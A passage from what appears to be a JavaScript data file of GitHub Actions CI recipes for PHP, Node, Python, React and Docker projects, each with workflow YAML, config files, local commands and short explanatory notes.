                secrets: inherit                            # pass all of the caller's secrets

              deploy-production:
                needs: deploy-staging
                uses: your-org/shared-workflows/.github/workflows/deploy.yml@v1   # another repository
                with:
                  environment: production
                secrets:
                  DEPLOY_KEY: ${GH} secrets.PROD_DEPLOY_KEY }}

              report:
                needs: deploy-production
                runs-on: ubuntu-latest
                steps:
                  - run: echo "Live at ${GH} needs.deploy-production.outputs.url }}"
            `,
          note: 'A job that calls a workflow cannot have its own steps or runs-on. Environment secrets are not passed through secrets: inherit; the called workflow must declare the environment itself, as above.',
        },
        {
          title: 'Composite action: .github/actions/setup-app/action.yml',
          lang: 'yaml',
          code: c`
            name: Setup app
            description: Install Node and PHP with caches, then install dependencies
            inputs:
              node-version:
                description: Node version
                default: '24'
              php-version:
                description: PHP version
                default: '8.3'
            outputs:
              php-path:
                description: Path to the PHP binary
                value: ${GH} steps.php.outputs.path }}
            runs:
              using: composite
              steps:
                - uses: actions/setup-node@v4
                  with:
                    node-version: ${GH} inputs.node-version }}
                    cache: npm
                - uses: shivammathur/setup-php@v2
                  with:
                    php-version: ${GH} inputs.php-version }}
                    tools: composer:v2
                - id: php
                  run: echo "path=$(command -v php)" >> "$GITHUB_OUTPUT"
                  shell: bash
                - run: npm ci
                  shell: bash
                - run: composer install --no-interaction --prefer-dist
                  shell: bash
            `,
          note: 'A composite action bundles repeated steps into one step. Every run step inside it must set shell explicitly, and it cannot read secrets directly, so pass them in as inputs.',
        },
        {
          title: 'Use the composite action',
          lang: 'yaml',
          code: c`
            jobs:
              test:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4             # local actions need the repo checked out first
                  - uses: ./.github/actions/setup-app
                    with:
                      php-version: '8.3'
                  - run: npm test && vendor/bin/phpunit
            `,
          note: 'From another repository, reference the folder that contains action.yml, followed by a tag.',
          then: [
            {
              label: 'From another repository',
              lang: 'yaml',
              code: c`
              - uses: your-org/your-actions/setup-app@v1
              `,
            },
          ],
        },
        {
          title: 'Which one to use',
          lang: 'text',
          code: c`
                                   Reusable workflow              Composite action
            Replaces               whole jobs                     a few steps inside a job
            File                   .github/workflows/x.yml        <folder>/action.yml
            Called with            jobs.<id>.uses                 steps[*].uses
            Own runner / runs-on   yes                            no, runs in the caller's job
            Secrets                secrets: or secrets: inherit   passed as inputs or env
            Environments           yes                            no
            Good for               shared deploy / release flow   shared setup (install, cache, login)
            `,
        },
        {
          title: 'Pin versions and keep them updated',
          lang: 'yaml',
          code: c`
            steps:
              - uses: actions/checkout@v4                     # major tag: gets fixes automatically
              - uses: your-org/your-actions/setup-app@v1.2.0  # exact tag
              - uses: some-org/some-action@0123456789abcdef0123456789abcdef01234567  # v2.3.1, full SHA, immutable
            `,
          note: 'Tags can be moved by the action\'s owner; a full commit SHA cannot. Pin third-party actions to a SHA with the version in a comment, and let Dependabot open PRs that update both when new versions are released.',
          then: [
            {
              label: '.github/dependabot.yml',
              lang: 'yaml',
              code: c`
              version: 2
              updates:
                - package-ecosystem: github-actions
                  directory: /
                  schedule:
                    interval: weekly
              `,
            },
          ],
        },
      ],
    },
    {
      id: 'ci-laravel',
      title: 'Laravel / PHP',
      group: 'CI pipelines',
      items: [
        {
          title: 'Complete workflow: .github/workflows/ci.yml',
          lang: 'yaml',
          code: c`
            name: CI

            on:
              push:
                branches: [main]
              pull_request:

            # A new push to the same PR cancels the run that is still going
            concurrency:
              group: ${GH} github.workflow }}-${GH} github.ref }}
              cancel-in-progress: ${GH} github.event_name == 'pull_request' }}

            permissions:
              contents: read

            jobs:
              tests:
                runs-on: ubuntu-latest
                timeout-minutes: 20

                services:
                  mysql:
                    image: mysql:8.4
                    env:
                      MYSQL_ROOT_PASSWORD: password
                      MYSQL_DATABASE: testing
                    ports:
                      - 3306:3306
                    options: >-
                      --health-cmd="mysqladmin ping -h 127.0.0.1"
                      --health-interval=10s
                      --health-timeout=5s
                      --health-retries=10

                # Real environment variables win over the values in .env
                env:
                  DB_CONNECTION: mysql
                  DB_HOST: 127.0.0.1
                  DB_PORT: 3306
                  DB_DATABASE: testing
                  DB_USERNAME: root
                  DB_PASSWORD: password

                steps:
                  - uses: actions/checkout@v4

                  - name: Set up PHP
                    uses: shivammathur/setup-php@v2
                    with:
                      php-version: '8.3'
                      extensions: mbstring, intl, bcmath, pdo_mysql, zip, gd
                      coverage: none
                      tools: composer:v2

                  - name: Find Composer cache directory
                    id: composer-cache
                    run: echo "dir=$(composer config cache-files-dir)" >> "$GITHUB_OUTPUT"

                  - name: Cache Composer downloads
                    uses: actions/cache@v4
                    with:
                      path: ${GH} steps.composer-cache.outputs.dir }}
                      key: composer-${GH} runner.os }}-${GH} hashFiles('composer.lock') }}
                      restore-keys: composer-${GH} runner.os }}-

                  - name: Install PHP dependencies
                    run: composer install --no-interaction --prefer-dist --no-progress

                  # Larastan boots the app, so .env and APP_KEY must exist before it runs
                  - name: Prepare .env
                    run: |
                      cp .env.example .env
                      php artisan key:generate

                  - name: Code style (Pint)
                    run: vendor/bin/pint --test

                  # Optional: delete this step if you do not use Larastan
                  - name: Static analysis (Larastan)
                    run: vendor/bin/phpstan analyse --memory-limit=1G --no-progress

                  - name: Set up Node
                    uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm

                  # Views that use @vite fail in tests without public/build/manifest.json
                  - name: Build front-end assets (Vite)
                    run: |
                      npm ci
                      npm run build

                  - name: Run migrations
                    run: php artisan migrate --force

                  - name: Run tests
                    run: php artisan test --parallel
            `,
          note: 'Runs on every pull request and on every push to main. Fast checks (style, static analysis) run before the slow ones, so a formatting mistake fails within a minute.',
        },
        {
          title: 'How the database settings reach Laravel',
          lang: 'html',
          code: c`
            <!-- phpunit.xml: an env entry only applies when the variable is not already set (unless force="true") -->
            <php>
                <env name="APP_ENV" value="testing"/>
                <env name="BCRYPT_ROUNDS" value="4"/>
                <env name="CACHE_STORE" value="array"/>
                <!-- <env name="DB_CONNECTION" value="sqlite"/> -->
                <!-- <env name="DB_DATABASE" value=":memory:"/> -->
                <env name="MAIL_MAILER" value="array"/>
                <env name="QUEUE_CONNECTION" value="sync"/>
                <env name="SESSION_DRIVER" value="array"/>
            </php>
            `,
          note: 'Laravel never overwrites an environment variable that is already set, and phpunit.xml env entries only fill in missing ones, so the DB_ values from the job env block win over both .env and phpunit.xml. Locally, with no such variables set, uncommenting the two SQLite lines switches your tests to an in-memory database.',
          then: [
            {
              label: 'SQLite instead of MySQL (no service needed): delete the services block and replace the job env block',
              lang: 'yaml',
              code: c`
                    env:
                      DB_CONNECTION: sqlite
                      DB_DATABASE: ':memory:'
                `,
            },
          ],
        },
        {
          title: 'Install the dev tools the workflow calls',
          lang: 'bash',
          code: c`
            # same on every OS
            # Pint ships with new Laravel apps; add it to older ones
            composer require --dev laravel/pint

            # Needed for php artisan test --parallel
            composer require --dev brianium/paratest

            # Optional: Larastan (PHPStan with Laravel rules)
            composer require --dev larastan/larastan
            `,
          note: 'Parallel tests create one database per process (testing_test_1, testing_test_2 ...), so the DB user needs permission to create databases. The root user in the MySQL service has it.',
          then: [
            {
              label: 'phpstan.neon (project root)',
              lang: 'yaml',
              code: c`
                includes:
                    - vendor/larastan/larastan/extension.neon

                parameters:
                    paths:
                        - app/
                    level: 5
                `,
            },
          ],
        },
        {
          title: 'Run the same checks locally before pushing',
          lang: 'bash',
          code: c`
            # same on every OS (calling the scripts through php avoids path differences on Windows)
            php vendor/bin/pint --test
            php vendor/bin/phpstan analyse --memory-limit=1G
            php artisan test --parallel

            # Fix style problems automatically
            php vendor/bin/pint
            `,
        },
        {
          title: 'Plain PHP variant (Composer + PHPUnit)',
          lang: 'yaml',
          code: c`
            name: CI

            on:
              push:
                branches: [main]
              pull_request:

            concurrency:
              group: ${GH} github.workflow }}-${GH} github.ref }}
              cancel-in-progress: ${GH} github.event_name == 'pull_request' }}

            permissions:
              contents: read

            jobs:
              phpunit:
                runs-on: ubuntu-latest
                timeout-minutes: 15
                strategy:
                  fail-fast: false
                  matrix:
                    php: ['8.2', '8.3']

                steps:
                  - uses: actions/checkout@v4

                  - uses: shivammathur/setup-php@v2
                    with:
                      php-version: ${GH} matrix.php }}
                      extensions: mbstring, intl
                      coverage: none

                  - name: Validate composer.json and composer.lock
                    run: composer validate --strict

                  - name: Cache vendor directory
                    uses: actions/cache@v4
                    with:
                      path: vendor
                      key: vendor-${GH} runner.os }}-php${GH} matrix.php }}-${GH} hashFiles('composer.lock') }}

                  - run: composer install --no-interaction --prefer-dist --no-progress

                  - run: vendor/bin/phpunit
            `,
          note: 'For a library or framework-free app. The matrix runs the suite once per PHP version; fail-fast: false lets every version finish so you see all failures at once. Commit composer.lock so the cache key changes when dependencies do.',
          then: [
            {
              label: 'With coverage (pcov + Codecov): change these steps',
              lang: 'yaml',
              code: c`
                      - uses: shivammathur/setup-php@v2
                        with:
                          php-version: ${GH} matrix.php }}
                          extensions: mbstring, intl
                          coverage: pcov

                      - run: vendor/bin/phpunit --coverage-clover coverage.xml

                      - uses: codecov/codecov-action@v5
                        if: matrix.php == '8.3'
                        with:
                          token: ${GH} secrets.CODECOV_TOKEN }}
                          files: coverage.xml
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'ci-node',
      title: 'Node.js (Express + Sequelize)',
      group: 'CI pipelines',
      items: [
        {
          title: 'Complete workflow: .github/workflows/ci.yml',
          lang: 'yaml',
          code: c`
            name: CI

            on:
              push:
                branches: [main]
              pull_request:

            concurrency:
              group: ${GH} github.workflow }}-${GH} github.ref }}
              cancel-in-progress: ${GH} github.event_name == 'pull_request' }}

            permissions:
              contents: read

            jobs:
              test:
                runs-on: ubuntu-latest
                timeout-minutes: 15

                strategy:
                  fail-fast: false
                  matrix:
                    node: [22, 24]

                services:
                  mysql:
                    image: mysql:8.4
                    env:
                      MYSQL_ROOT_PASSWORD: password
                      MYSQL_DATABASE: app_test
                      MYSQL_USER: app
                      MYSQL_PASSWORD: password
                    ports:
                      - 3306:3306
                    options: >-
                      --health-cmd="mysqladmin ping -h 127.0.0.1"
                      --health-interval=10s
                      --health-timeout=5s
                      --health-retries=10

                env:
                  NODE_ENV: test
                  DB_HOST: 127.0.0.1
                  DB_PORT: 3306
                  DB_NAME: app_test
                  DB_USER: app
                  DB_PASSWORD: password

                steps:
                  - uses: actions/checkout@v4

                  - uses: actions/setup-node@v4
                    with:
                      node-version: ${GH} matrix.node }}
                      cache: npm

                  - run: npm ci

                  - name: Lint
                    run: npm run lint

                  - name: Run migrations
                    run: npx sequelize-cli db:migrate --env test

                  - name: Tests with coverage
                    run: npm run test:coverage

                  - name: Upload coverage report
                    if: always() && matrix.node == 24
                    uses: actions/upload-artifact@v4
                    with:
                      name: coverage
                      path: coverage/
                      retention-days: 7
            `,
          note: 'Each matrix leg gets its own fresh MySQL container, so the Node 22 and Node 24 runs never share data. The coverage report is uploaded from one leg only, because artifact names must be unique within a run.',
          then: [
            {
              label: 'Keep coverage from every leg instead',
              lang: 'yaml',
              code: c`
                      - name: Upload coverage report
                        if: always()
                        uses: actions/upload-artifact@v4
                        with:
                          name: coverage-node-${GH} matrix.node }}
                          path: coverage/
                          retention-days: 7
                `,
            },
          ],
        },
        {
          title: 'package.json scripts the workflow expects',
          lang: 'json',
          code: c`
            {
              "scripts": {
                "start": "node src/server.js",
                "lint": "eslint .",
                "test": "jest --runInBand",
                "test:coverage": "jest --runInBand --coverage",
                "db:migrate": "sequelize-cli db:migrate"
              },
              "dependencies": {
                "dotenv": "^16.4.5",
                "express": "^4.21.0",
                "mysql2": "^3.11.0",
                "sequelize": "^6.37.0"
              },
              "devDependencies": {
                "eslint": "^9.0.0",
                "jest": "^29.7.0",
                "sequelize-cli": "^6.6.2",
                "supertest": "^7.0.0"
              }
            }
            `,
          note: 'runInBand runs test files one after another, so tests that write to the shared test database do not interfere with each other. A separate test:coverage script avoids passing extra flags through npm, which Windows PowerShell can swallow. Jest writes the report to coverage/, the folder the workflow uploads.',
        },
        {
          title: 'Sequelize config that reads the CI variables',
          lang: 'js',
          code: c`
            // config/config.js: sequelize-cli picks the block named by --env (or NODE_ENV)
            require('dotenv').config() // loads .env locally; does nothing in CI where no .env exists

            const fromEnv = {
              host: process.env.DB_HOST,
              port: Number(process.env.DB_PORT || 3306),
              username: process.env.DB_USER,
              password: process.env.DB_PASSWORD,
              database: process.env.DB_NAME,
              dialect: 'mysql',
              logging: false,
            }

            module.exports = {
              development: fromEnv,
              test: fromEnv,
              production: fromEnv,
            }
            `,
          note: 'A config.json file cannot read environment variables, so use a JavaScript config. If package.json has "type": "module", name the file config.cjs (and .sequelizerc stays CommonJS) and point to it from .sequelizerc.',
          then: [
            {
              label: '.sequelizerc (project root)',
              lang: 'js',
              code: c`
                const path = require('node:path')

                module.exports = {
                  config: path.resolve('config', 'config.js'),
                  'models-path': path.resolve('src', 'models'),
                  'migrations-path': path.resolve('src', 'migrations'),
                  'seeders-path': path.resolve('src', 'seeders'),
                }
                `,
            },
          ],
        },
        {
          title: 'Run the pipeline locally against a throwaway MySQL',
          lang: 'bash',
          code: c`
            # same on every OS (Docker Desktop on macOS / Windows, Docker Engine on Linux)
            docker run -d --name app-test-db -p 3306:3306 -e MYSQL_ROOT_PASSWORD=password -e MYSQL_DATABASE=app_test -e MYSQL_USER=app -e MYSQL_PASSWORD=password mysql:8.4

            npm ci
            npm run lint
            npx sequelize-cli db:migrate --env test
            npm run test:coverage

            # Remove the container when done
            docker rm -f app-test-db
            `,
          note: 'Put the same DB_ values in your local .env file (DB_HOST=127.0.0.1, DB_NAME=app_test, DB_USER=app, DB_PASSWORD=password) so the config file picks them up. If a local MySQL already uses port 3306, map another host port and change DB_PORT to match.',
        },
      ],
    },
    {
      id: 'ci-python',
      title: 'Python (Django / FastAPI)',
      group: 'CI pipelines',
      items: [
        {
          title: 'Django: complete .github/workflows/ci.yml',
          lang: 'yaml',
          code: c`
            name: CI

            on:
              push:
                branches: [main]
              pull_request:

            concurrency:
              group: ${GH} github.workflow }}-${GH} github.ref }}
              cancel-in-progress: ${GH} github.event_name == 'pull_request' }}

            permissions:
              contents: read

            jobs:
              test:
                runs-on: ubuntu-latest
                timeout-minutes: 15

                services:
                  postgres:
                    image: postgres:17
                    env:
                      POSTGRES_USER: app
                      POSTGRES_PASSWORD: password
                      POSTGRES_DB: app_test
                    ports:
                      - 5432:5432
                    options: >-
                      --health-cmd="pg_isready -U app -d app_test"
                      --health-interval=10s
                      --health-timeout=5s
                      --health-retries=10

                env:
                  DATABASE_URL: postgres://app:password@127.0.0.1:5432/app_test
                  SECRET_KEY: ci-only-not-a-real-secret
                  DEBUG: 'false'

                steps:
                  - uses: actions/checkout@v4

                  - uses: actions/setup-python@v5
                    with:
                      python-version: '3.12'
                      cache: pip
                      cache-dependency-path: |
                        requirements.txt
                        requirements-dev.txt

                  - name: Install dependencies
                    run: |
                      python -m pip install --upgrade pip
                      pip install -r requirements.txt -r requirements-dev.txt

                  - name: Lint and format check (ruff)
                    run: |
                      ruff check .
                      ruff format --check .

                  # Optional: delete this step if you do not type-check
                  - name: Type-check (mypy)
                    run: mypy .

                  - name: Fail if a model change has no migration
                    run: python manage.py makemigrations --check --dry-run

                  - name: Run migrations
                    run: python manage.py migrate --noinput

                  - name: Run tests
                    run: python manage.py test
            `,
          note: 'manage.py test creates its own test_app_test database and drops it afterwards; the Postgres user created by the service is a superuser, so it is allowed to. The makemigrations --check step catches model changes someone forgot to commit a migration for.',
        },
        {
          title: 'Settings that read the CI variables',
          lang: 'python',
          code: c`
            # config/settings.py  (pip install dj-database-url "psycopg[binary]")
            import os

            import dj_database_url

            SECRET_KEY = os.environ['SECRET_KEY']
            DEBUG = os.environ.get('DEBUG', 'false').lower() == 'true'

            # Reads DATABASE_URL, e.g. postgres://app:password@127.0.0.1:5432/app_test
            DATABASES = {
                'default': dj_database_url.config(conn_max_age=600),
            }
            `,
          note: 'One DATABASE_URL variable works the same in CI, in Docker and on the server, so the settings file has no CI-specific branches.',
        },
        {
          title: 'pytest instead of manage.py test (Django)',
          lang: 'yaml',
          code: c`
                  - name: Run tests
                    run: pytest --cov --cov-report=xml

                  - name: Upload coverage report
                    if: always()
                    uses: actions/upload-artifact@v4
                    with:
                      name: coverage
                      path: coverage.xml
                      retention-days: 7
            `,
          note: 'Replace the last step of the Django workflow with these. Needs pytest, pytest-django and pytest-cov in requirements-dev.txt; pytest-django creates and drops the test database itself.',
          then: [
            {
              label: 'pyproject.toml',
              lang: 'ini',
              code: c`
                [tool.pytest.ini_options]
                DJANGO_SETTINGS_MODULE = "config.settings"
                python_files = ["test_*.py", "tests.py"]
                addopts = "-q"
                `,
            },
          ],
        },
        {
          title: 'FastAPI: complete .github/workflows/ci.yml',
          lang: 'yaml',
          code: c`
            name: CI

            on:
              push:
                branches: [main]
              pull_request:

            concurrency:
              group: ${GH} github.workflow }}-${GH} github.ref }}
              cancel-in-progress: ${GH} github.event_name == 'pull_request' }}

            permissions:
              contents: read

            jobs:
              test:
                runs-on: ubuntu-latest
                timeout-minutes: 15

                services:
                  postgres:
                    image: postgres:17
                    env:
                      POSTGRES_USER: app
                      POSTGRES_PASSWORD: password
                      POSTGRES_DB: app_test
                    ports:
                      - 5432:5432
                    options: >-
                      --health-cmd="pg_isready -U app -d app_test"
                      --health-interval=10s
                      --health-timeout=5s
                      --health-retries=10

                env:
                  DATABASE_URL: postgresql+psycopg://app:password@127.0.0.1:5432/app_test

                steps:
                  - uses: actions/checkout@v4

                  - uses: actions/setup-python@v5
                    with:
                      python-version: '3.12'
                      cache: pip
                      cache-dependency-path: |
                        requirements.txt
                        requirements-dev.txt

                  - run: pip install -r requirements.txt -r requirements-dev.txt

                  - name: Lint and format check (ruff)
                    run: |
                      ruff check .
                      ruff format --check .

                  # Optional: delete this step if you do not type-check
                  - name: Type-check (mypy)
                    run: mypy app

                  # Optional: delete if you do not use Alembic
                  - name: Apply migrations
                    run: alembic upgrade head

                  - name: Run tests
                    run: pytest --cov=app --cov-report=xml

                  - name: Upload coverage report
                    if: always()
                    uses: actions/upload-artifact@v4
                    with:
                      name: coverage
                      path: coverage.xml
                      retention-days: 7
            `,
          note: 'The +psycopg part of the URL tells SQLAlchemy to use the psycopg 3 driver; alembic/env.py must read DATABASE_URL for the migration step to use it. Running alembic upgrade head in CI proves the migrations apply cleanly to an empty database.',
        },
        {
          title: 'uv alternative (pyproject.toml + uv.lock)',
          lang: 'yaml',
          code: c`
                steps:
                  - uses: actions/checkout@v4

                  - uses: actions/setup-python@v5
                    with:
                      python-version: '3.12'

                  - name: Install uv
                    run: pip install uv

                  - name: Cache uv downloads
                    uses: actions/cache@v4
                    with:
                      path: ~/.cache/uv
                      key: uv-${GH} runner.os }}-${GH} hashFiles('uv.lock') }}
                      restore-keys: uv-${GH} runner.os }}-

                  # --locked fails if uv.lock is out of date with pyproject.toml
                  - run: uv sync --locked

                  - run: uv run ruff check .
                  - run: uv run ruff format --check .

                  # Django: uv run python manage.py migrate --noinput
                  # FastAPI: uv run alembic upgrade head
                  - run: uv run pytest

                  - name: Trim the cache before it is saved
                    run: uv cache prune --ci
            `,
          note: 'Replaces the steps of either workflow above; keep the services and env blocks. uv sync installs the dev dependency group by default, so no separate requirements-dev.txt is needed.',
        },
        {
          title: 'Ruff and mypy settings',
          lang: 'ini',
          code: c`
            # pyproject.toml
            [tool.ruff]
            line-length = 100
            target-version = "py312"

            [tool.ruff.lint]
            select = ["E", "F", "I", "B", "UP"]

            [tool.mypy]
            python_version = "3.12"
            ignore_missing_imports = true

            # Django only (pip install django-stubs)
            # plugins = ["mypy_django_plugin.main"]
            # [tool.django-stubs]
            # django_settings_module = "config.settings"
            `,
        },
        {
          title: 'Run the checks locally',
          lang: 'bash',
          code: c`
            # macOS
            python3 -m venv .venv
            source .venv/bin/activate

            # Linux (Ubuntu / Debian): install the venv module first if it is missing
            sudo apt install -y python3-venv
            python3 -m venv .venv
            source .venv/bin/activate

            # Windows (PowerShell)
            py -m venv .venv
            Set-ExecutionPolicy -Scope CurrentUser RemoteSigned   # once, if activation is blocked
            .venv\Scripts\Activate.ps1

            # then, same on every OS
            pip install -r requirements.txt -r requirements-dev.txt
            ruff check .
            ruff format --check .
            mypy .
            pytest
            `,
        },
      ],
    },
    {
      id: 'ci-react',
      title: 'React / frontend',
      group: 'CI pipelines',
      items: [
        {
          title: 'Complete workflow: .github/workflows/ci.yml',
          lang: 'yaml',
          code: c`
            name: CI

            on:
              push:
                branches: [main]
              pull_request:

            concurrency:
              group: ${GH} github.workflow }}-${GH} github.ref }}
              cancel-in-progress: ${GH} github.event_name == 'pull_request' }}

            permissions:
              contents: read

            jobs:
              build:
                runs-on: ubuntu-latest
                timeout-minutes: 10
                steps:
                  - uses: actions/checkout@v4

                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm

                  - run: npm ci

                  - name: Lint
                    run: npm run lint

                  - name: Type-check
                    run: npm run typecheck

                  - name: Unit tests (Vitest)
                    run: npm test

                  - name: Build
                    run: npm run build
                    env:
                      VITE_API_URL: ${GH} vars.VITE_API_URL }}
                      VITE_APP_NAME: ${GH} vars.VITE_APP_NAME }}

                  - name: Upload dist
                    uses: actions/upload-artifact@v4
                    with:
                      name: dist
                      path: dist/
                      retention-days: 7

              # Optional: end-to-end tests against the exact build from the job above
              e2e:
                needs: build
                runs-on: ubuntu-latest
                timeout-minutes: 15
                steps:
                  - uses: actions/checkout@v4

                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm

                  - run: npm ci

                  - uses: actions/download-artifact@v4
                    with:
                      name: dist
                      path: dist

                  - name: Install Playwright browser
                    run: npx playwright install --with-deps chromium

                  - name: Run Playwright
                    run: npx playwright test

                  - name: Upload Playwright report
                    if: failure()
                    uses: actions/upload-artifact@v4
                    with:
                      name: playwright-report
                      path: playwright-report/
                      retention-days: 7
            `,
          note: 'Vite bakes VITE_ variables into the JavaScript bundle at build time, so they must be present during npm run build. The dist artifact can be downloaded from the run page or reused by a deploy job.',
        },
        {
          title: 'package.json scripts the workflow expects',
          lang: 'json',
          code: c`
            {
              "scripts": {
                "dev": "vite",
                "build": "tsc -b && vite build",
                "preview": "vite preview",
                "lint": "eslint .",
                "typecheck": "tsc -b",
                "test": "vitest run"
              }
            }
            `,
          note: 'vitest run executes once and exits; plain vitest starts watch mode, which would hang outside CI.',
        },
        {
          title: 'Set the VITE_ values as repository variables',
          lang: 'bash',
          code: c`
            # same on every OS (GitHub CLI, run inside the repo)
            gh variable set VITE_API_URL --body "https://api.example.com"
            gh variable set VITE_APP_NAME --body "Your App"

            # Per-environment value (the job also needs: environment: production)
            gh variable set VITE_API_URL --env production --body "https://api.example.com"

            gh variable list
            `,
          note: 'Use variables (vars), not secrets: anything prefixed VITE_ ends up in the public bundle where anyone can read it. Real secrets belong on the server, never in front-end code.',
        },
        {
          title: 'Playwright config for CI',
          lang: 'ts',
          code: c`
            // playwright.config.ts
            import { defineConfig, devices } from '@playwright/test'

            export default defineConfig({
              testDir: './e2e',
              forbidOnly: !!process.env.CI,
              retries: process.env.CI ? 2 : 0,
              workers: process.env.CI ? 1 : undefined,
              reporter: process.env.CI ? [['github'], ['html', { open: 'never' }]] : 'list',
              use: {
                baseURL: 'http://localhost:4173',
                trace: 'on-first-retry',
              },
              projects: [{ name: 'chromium', use: { ...devices['Desktop Chrome'] } }],
              // Serves the already-built dist folder; no rebuild in the e2e job
              webServer: {
                command: 'npx vite preview --port 4173 --strictPort',
                url: 'http://localhost:4173',
                reuseExistingServer: !process.env.CI,
              },
            })
            `,
          note: 'GitHub sets CI=true on every runner, so the same config behaves strictly in CI and stays convenient locally. Locally, run npm run build first, because vite preview only serves an existing dist folder.',
          then: [
            {
              label: 'vite.config.ts: stop Vitest from picking up the Playwright specs',
              lang: 'ts',
              code: c`
                // defineConfig from vitest/config knows the test key, so tsc -b does not fail on it
                import { defineConfig, configDefaults } from 'vitest/config'
                import react from '@vitejs/plugin-react'

                export default defineConfig({
                  plugins: [react()],
                  test: {
                    exclude: [...configDefaults.exclude, 'e2e/**'],
                  },
                })
                `,
            },
          ],
        },
        {
          title: 'Run the CI checks locally',
          lang: 'bash',
          code: c`
            # same on every OS
            npm ci
            npm run lint
            npm run typecheck
            npm test
            npm run build

            # End-to-end (first time: download the browser; serves the dist from the build above)
            npx playwright install chromium
            npx playwright test
            `,
        },
      ],
    },
    {
      id: 'ci-docker',
      title: 'Docker images',
      group: 'CI pipelines',
      items: [
        {
          title: 'Complete workflow: .github/workflows/docker.yml',
          lang: 'yaml',
          code: c`
            name: Docker

            on:
              push:
                branches: [main]
                tags: ['v*.*.*']
              pull_request:

            concurrency:
              group: ${GH} github.workflow }}-${GH} github.ref }}
              cancel-in-progress: ${GH} github.event_name == 'pull_request' }}

            permissions:
              contents: read

            jobs:
              image:
                runs-on: ubuntu-latest
                timeout-minutes: 30
                permissions:
                  contents: read
                  packages: write
                steps:
                  - uses: actions/checkout@v4

                  - uses: docker/setup-buildx-action@v3

                  - name: Work out tags and labels
                    id: meta
                    uses: docker/metadata-action@v5
                    with:
                      images: ghcr.io/${GH} github.repository }}
                      tags: |
                        type=ref,event=branch
                        type=ref,event=pr
                        type=sha
                        type=semver,pattern={{version}}
                        type=semver,pattern={{major}}.{{minor}}

                  - name: Log in to GHCR
                    if: github.event_name != 'pull_request'
                    uses: docker/login-action@v3
                    with:
                      registry: ghcr.io
                      username: ${GH} github.actor }}
                      password: ${GH} secrets.GITHUB_TOKEN }}

                  - name: Build (and push on main / tags)
                    uses: docker/build-push-action@v6
                    with:
                      context: .
                      push: ${GH} github.event_name != 'pull_request' }}
                      tags: ${GH} steps.meta.outputs.tags }}
                      labels: ${GH} steps.meta.outputs.labels }}
                      cache-from: type=gha
                      cache-to: type=gha,mode=max
            `,
          note: 'Pull requests only build the image, which proves the Dockerfile still works without publishing anything. Pushes to main and version tags log in with the built-in GITHUB_TOKEN and push to ghcr.io; metadata-action lowercases the image name, which GHCR requires. packages: write is granted to this job only.',
        },
        {
          title: 'Which tags each event produces',
          lang: 'text',
          code: c`
            Event                    Tags on ghcr.io/your-org/your-app
            push to main             main, sha-1a2b3c4
            git tag v1.4.2 pushed    1.4.2, 1.4, latest, sha-1a2b3c4
            pull request #12         pr-12, sha-1a2b3c4 (built only, not pushed)
            push to other branches   workflow does not run
            `,
          note: 'latest follows the newest release tag, not main. Deploy by an immutable tag such as sha-1a2b3c4 or 1.4.2 so a server always runs exactly the image you tested.',
          then: [
            {
              label: 'Release a version',
              lang: 'bash',
              code: c`
                # same on every OS
                git tag v1.4.2
                git push origin v1.4.2
                `,
            },
          ],
        },
        {
          title: 'Build arguments and build secrets',
          lang: 'yaml',
          code: c`
                  - uses: docker/build-push-action@v6
                    with:
                      context: .
                      push: ${GH} github.event_name != 'pull_request' }}
                      tags: ${GH} steps.meta.outputs.tags }}
                      labels: ${GH} steps.meta.outputs.labels }}
                      cache-from: type=gha
                      cache-to: type=gha,mode=max
                      build-args: |
                        APP_VERSION=${GH} github.sha }}
                      secrets: |
                        composer_auth=${GH} secrets.COMPOSER_AUTH }}
            `,
          note: 'Build arguments are stored in the image history, so use them only for non-secret values. Build secrets are mounted for a single RUN step and never end up in a layer.',
          then: [
            {
              label: 'Dockerfile side',
              lang: 'dockerfile',
              code: c`
                # syntax=docker/dockerfile:1
                FROM php:8.3-fpm
                COPY --from=composer:2 /usr/bin/composer /usr/bin/composer
                ARG APP_VERSION=dev
                ENV APP_VERSION=$APP_VERSION
                WORKDIR /var/www/app
                COPY composer.json composer.lock ./
                # COMPOSER_AUTH holds the JSON of an auth.json file, only for this step
                RUN --mount=type=secret,id=composer_auth,env=COMPOSER_AUTH \
                    composer install --no-dev --no-scripts --prefer-dist --no-interaction
                `,
            },
          ],
        },
        {
          title: 'Several images in one repo: separate the cache',
          lang: 'yaml',
          code: c`
                  - uses: docker/build-push-action@v6
                    with:
                      context: ./apps/api
                      file: ./apps/api/Dockerfile
                      push: ${GH} github.event_name != 'pull_request' }}
                      tags: ${GH} steps.meta.outputs.tags }}
                      labels: ${GH} steps.meta.outputs.labels }}
                      cache-from: type=gha,scope=api
                      cache-to: type=gha,scope=api,mode=max
            `,
          note: 'Without a scope, every image writes to the same cache entry and they keep evicting each other. Give each image its own metadata-action step with its own images name. mode=max also caches intermediate stages; the repository cache limit is 10 GB by default, after which the oldest entries are removed.',
        },
        {
          title: 'Pull the image on your machine or a server',
          lang: 'bash',
          code: c`
            # macOS / Linux (Ubuntu / Debian)
            echo "$GHCR_TOKEN" | docker login ghcr.io -u your-github-username --password-stdin

            # Windows (PowerShell)
            $env:GHCR_TOKEN | docker login ghcr.io -u your-github-username --password-stdin

            # then, same on every OS
            docker pull ghcr.io/your-org/your-app:sha-1a2b3c4
            `,
          note: 'GHCR_TOKEN is a personal access token (classic) with only the read:packages scope. Piping it to --password-stdin keeps it out of your shell history and process list. Public packages can be pulled without logging in.',
        },
        {
          title: 'If the push is denied',
          note: 'The first push from a workflow creates the package and links it to the repository through the org.opencontainers.image.source label that metadata-action adds. If the package already existed, open its Package settings, add the repository under Manage Actions access and give it the Write role. Also check that the job has packages: write.',
        },
        {
          title: 'Pull requests from forks',
          note: 'Fork pull requests get a read-only GITHUB_TOKEN and no repository secrets, which is why the login and push steps are skipped on pull_request. Do not switch to pull_request_target to get around this: it runs with write access and secrets, and checking out and building the fork\'s code there lets that code steal them.',
        },
      ],
    },
    {
      id: 'ci-monorepo',
      title: 'Monorepo: run only what changed',
      group: 'CI pipelines',
      items: [
        {
          title: 'Layout used in these examples',
          lang: 'text',
          code: c`
            your-app/
            ├── apps/
            │   ├── api/              Laravel API       → run PHP tests when this changes
            │   └── web/              React + Vite      → run front-end checks when this
            ├── packages/
